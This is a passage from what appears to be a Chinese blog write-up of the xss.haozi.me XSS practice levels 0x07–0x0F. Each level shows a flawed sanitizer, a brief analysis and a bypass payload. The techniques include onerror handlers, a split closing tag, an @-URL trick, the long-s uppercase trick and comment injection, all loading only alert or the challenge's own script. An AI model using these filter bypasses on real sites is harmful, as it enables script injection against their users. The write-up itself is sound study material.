src=\"/img/xss/haozi/006.png\" alt=\"006\"></p>\n<h1 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h1><h2 id=\"server-code-7\"><a href=\"#server-code-7\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> stripTagsRe = <span class=\"regexp\">/&lt;\\/?[^&gt;]+&gt;/gi</span></span><br><span class=\"line\"></span><br><span class=\"line\">  input = input.replace(stripTagsRe, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`&lt;article&gt;<span class=\"subst\">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-7\"><a href=\"#分析-7\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了<span class=\"tag\">&lt;&gt;</span>包含的所有内容并替换成空,利用浏览器兼容性绕过</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-7\"><a href=\"#input-code-7\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. </span><br><span class=\"line\">&lt;<span class=\"selector-tag\">img</span> src=<span class=\"string\">''</span> onerror=alert`<span class=\"number\">1</span>`</span><br><span class=\"line\">     <span class=\"comment\">//这里有个换行</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-7\"><a href=\"#html-7\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. &lt;input <span class=\"built_in\">value</span>=<span class=\"number\">1</span> <span class=\"built_in\">type</span>='image' src='' onerror</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>) <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/007.png\" alt=\"007\"></p>\n<h1 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h1><h2 id=\"server-code-8\"><a href=\"#server-code-8\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">src</span>) </span>&#123;</span><br><span class=\"line\">  src = src.replace(<span class=\"regexp\">/&lt;\\/style&gt;/ig</span>, <span class=\"string\">'/* \\u574F\\u4EBA */'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">    &lt;style&gt;</span></span><br><span class=\"line\"><span class=\"string\">      <span class=\"subst\">$&#123;src&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">    &lt;/style&gt;</span></span><br><span class=\"line\"><span class=\"string\">  `</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-8\"><a href=\"#分析-8\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了<span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>的大小写。如果输入了<span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>会被替换成/* 坏人 */。通过换行绕过<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\">即可。</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-8\"><a href=\"#input-code-8\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">style</span></span></span><br><span class=\"line\"><span class=\"tag\">       &gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert</span>`<span class=\"attr\">1</span>`&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-8\"><a href=\"#html-8\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">      &lt;/style</span></span><br><span class=\"line\"><span class=\"xml\">       &gt;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert</span>`<span class=\"attr\">1</span>`&gt;</span></span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/008.png\" alt=\"008\"></p>\n<h1 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h1><h2 id=\"server-code-9\"><a href=\"#server-code-9\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> domainRe = <span class=\"regexp\">/^https?:\\/\\/www\\.segmentfault\\.com/</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (domainRe.test(input)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`&lt;script src=\"<span class=\"subst\">$&#123;input&#125;</span>\"&gt;&lt;/script&gt;`</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'Invalid URL'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-9\"><a href=\"#分析-9\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用正则表达式匹配<span class=\"symbol\">'https</span>(http):<span class=\"comment\">//www.segmentfault.com',构造闭合即可。</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-9\"><a href=\"#input-code-9\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\">https://www.segmentfault.com\"&gt;<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-9\"><a href=\"#html-9\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://www.segmentfault.com\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>\"&gt;<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/009.png\" alt=\"009\"></p>\n<h1 id=\"0x0A\"><a href=\"#0x0A\" class=\"headerlink\" title=\"0x0A\"></a>0x0A</h1><h2 id=\"server-code-10\"><a href=\"#server-code-10\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escapeHtml</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.replace(<span class=\"regexp\">/&amp;/g</span>, <span class=\"string\">'&amp;amp;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">'&amp;#39;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\"/g</span>, <span class=\"string\">'&amp;quot;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&lt;/g</span>, <span class=\"string\">'&amp;lt;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&gt;/g</span>, <span class=\"string\">'&amp;gt;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\//g</span>, <span class=\"string\">'&amp;#x2f'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> domainRe = <span class=\"regexp\">/^https?:\\/\\/www\\.segmentfault\\.com/</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (domainRe.test(input)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`&lt;script src=\"<span class=\"subst\">$&#123;escapeHtml(input)&#125;</span>\"&gt;&lt;/script&gt;`</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'Invalid URL'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-10\"><a href=\"#分析-10\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用正则表达式匹配'https(http)://www.segmentfault.com',用html实体替换<span class=\"meta\">&amp;'\"&lt;&gt;\\。</span></span><br><span class=\"line\"><span class=\"number\">1</span>.利用url中的@引用js</span><br><span class=\"line\"><span class=\"number\">2</span>.直接在给定的网址https:<span class=\"comment\">//www.segmentfault.com 注册账号，新建一个笔记，内容为alert(1)，再调用这个笔记链接即可，需要换行</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-10\"><a href=\"#input-code-10\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> <span class=\"string\">https:</span><span class=\"comment\">//www.segmentfault.com@xss.haozi.me/j.js</span></span><br><span class=\"line\"><span class=\"number\">2.</span> <span class=\"string\">https:</span><span class=\"comment\">//www.segmentfault.com/n/</span></span><br><span class=\"line\"><span class=\"number\">1330000016631643</span>/raw （这一行换行）</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-10\"><a href=\"#html-10\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> &lt;script src=<span class=\"string\">\"https:&amp;<span class=\"subst\">#x2f</span>&amp;<span class=\"subst\">#x2fwww</span>.segmentfault.com@xss.haozi.me&amp;<span class=\"subst\">#x2fj</span>.js\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\"><span class=\"number\">2.</span> &lt;script src=<span class=\"string\">\"https:&amp;<span class=\"subst\">#x2f</span>&amp;<span class=\"subst\">#x2fwww</span>.segmentfault.com&amp;<span class=\"subst\">#x2fn</span>&amp;<span class=\"subst\">#x2f</span></span></span><br><span class=\"line\"><span class=\"string\">1330000016631643&amp;<span class=\"subst\">#x2fraw</span>\"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00A.png\" alt=\"00A\"></p>\n<h1 id=\"0x0B\"><a href=\"#0x0B\" class=\"headerlink\" title=\"0x0B\"></a>0x0B</h1><h2 id=\"server-code-11\"><a href=\"#server-code-11\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.toUpperCase()</span><br><span class=\"line\">  <span class=\"keyword\">return</span> `&lt;h1&gt;$&#123;<span class=\"built_in\">input</span>&#125;&lt;/h1&gt;`</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-11\"><a href=\"#分析-11\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将输入的数据用toUpperCase进行了大写转换。可以利用<span class=\"selector-tag\">html</span> 标签, 域名 不区分大小写的方式来攻克。</span><br><span class=\"line\"><span class=\"number\">1</span>.引用外部链接解决</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-11\"><a href=\"#input-code-11\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://xss.haozi.me/j.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-11\"><a href=\"#html-11\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SCRIPT</span> <span class=\"attr\">SRC</span>=<span class=\"string\">\"HTTPS://XSS.HAOZI.ME/J.JS\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">SCRIPT</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00B.png\" alt=\"00B\"></p>\n<h1 id=\"0x0C\"><a href=\"#0x0C\" class=\"headerlink\" title=\"0x0C\"></a>0x0C</h1><h2 id=\"server-code-12\"><a href=\"#server-code-12\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function render (input) &#123;</span><br><span class=\"line\">  <span class=\"selector-tag\">input</span> = <span class=\"selector-tag\">input</span>.replace(/script/ig, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"selector-tag\">input</span> = <span class=\"selector-tag\">input</span>.toUpperCase()</span><br><span class=\"line\">  return <span class=\"string\">'&lt;h1&gt;'</span> + <span class=\"selector-tag\">input</span> + <span class=\"string\">'&lt;/h1&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-12\"><a href=\"#分析-12\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">首先将<span class=\"keyword\">script</span>不论大小写用空替换,并将输入的数据用toUpperCase进行了大写转换。绕过<span class=\"keyword\">script</span>过滤后利用html 标签, 域名 不区分大小写的方式来攻克。</span><br><span class=\"line\"><span class=\"number\">1.</span>引用外部链接解决</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-12\"><a href=\"#input-code-12\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">scscriptript</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://xss.haozi.me/j.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-12\"><a href=\"#html-12\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SCRIPT</span> <span class=\"attr\">SRC</span>=<span class=\"string\">\"HTTPS://XSS.HAOZI.ME/J.JS\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">SCRIPT</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00C.png\" alt=\"00C\"></p>\n<h1 id=\"0x0D\"><a href=\"#0x0D\" class=\"headerlink\" title=\"0x0D\"></a>0x0D</h1><h2 id=\"server-code-13\"><a href=\"#server-code-13\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  input = input.replace(<span class=\"regexp\">/[&lt;/\"']/g</span>, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">    &lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">          // alert('<span class=\"subst\">$&#123;input&#125;</span>')</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  `</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-13\"><a href=\"#分析-13\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了&lt;<span class=\"regexp\">/\"',并用/</span>/单行注释,但是可以换行绕过过滤,使用html注释<span class=\"function\">--&gt;</span>来注释后面的js，使代码正常运行。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-13\"><a href=\"#input-code-13\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.</span><br><span class=\"line\"><span class=\"comment\">//这一行换行</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">alert</span><span class=\"params\">(`<span class=\"number\">1</span>`)</span></span></span><br><span class=\"line\">--&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-13\"><a href=\"#html-13\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">          <span class=\"comment\">// alert('</span></span></span><br><span class=\"line\"><span class=\"javascript\">alert(<span class=\"string\">`1`</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">--&gt;')</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00D.png\" alt=\"00D\"></p>\n<h1 id=\"0x0E\"><a href=\"#0x0E\" class=\"headerlink\" title=\"0x0E\"></a>0x0E</h1><h2 id=\"server-code-14\"><a href=\"#server-code-14\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function render (input) &#123;</span><br><span class=\"line\">  <span class=\"selector-tag\">input</span> = <span class=\"selector-tag\">input</span>.replace(/&lt;([a-zA-Z])/g, <span class=\"string\">'&lt;_$1'</span>)</span><br><span class=\"line\">  <span class=\"selector-tag\">input</span> = <span class=\"selector-tag\">input</span>.toUpperCase()</span><br><span class=\"line\">  return <span class=\"string\">'&lt;h1&gt;'</span> + <span class=\"selector-tag\">input</span> + <span class=\"string\">'&lt;/h1&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-14\"><a href=\"#分析-14\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将&lt;后的第一个字符变成了<span class=\"number\">_</span>字符,导致<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">变成</span></span><span class=\"xml\"><span class=\"handlebars\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">_script</span>&gt;</span>,有个特殊ſ 字符,是古英语中的s的写法, 转成大写是正常的S。</span></span></span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-14\"><a href=\"#input-code-14\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.<span class=\"tag\">&lt;<span class=\"name\">ſcript</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://xss.haozi.me/j.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-14\"><a href=\"#html-14\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SCRIPT</span> <span class=\"attr\">SRC</span>=<span class=\"string\">\"HTTPS://XSS.HAOZI.ME/J.JS\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">SCRIPT</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00E.png\" alt=\"00E\"></p>\n<h1 id=\"0x0F\"><a href=\"#0x0F\" class=\"headerlink\" title=\"0x0F\"></a>0x0F</h1><h2 id=\"server-code-15\"><a href=\"#server-code-15\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escapeHtml</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.replace(<span class=\"regexp\">/&amp;/g</span>, <span class=\"string\">'&amp;amp;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">'&amp;#39;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\"/g</span>, <span class=\"string\">'&amp;quot;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&lt;/g</span>, <span class=\"string\">'&amp;lt;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&gt;/g</span>, <span class=\"string\">'&amp;gt;'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\//g</span>, <span class=\"string\">'&amp;#x2f;'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`&lt;img src onerror=\"console.error('<span class=\"subst\">$&#123;escapeHtml(input)&#125;</span>')\"&gt;`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-15\"><a href=\"#分析-15\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对<span class=\"selector-tag\">html</span> inline js 转义就是做无用功，浏览器会先解析<span class=\"selector-tag\">html</span>, 然后再解析 js。构造闭合就行。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-15\"><a href=\"#input-code-15\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>');alert('<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-15\"><a href=\"#html-15\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span 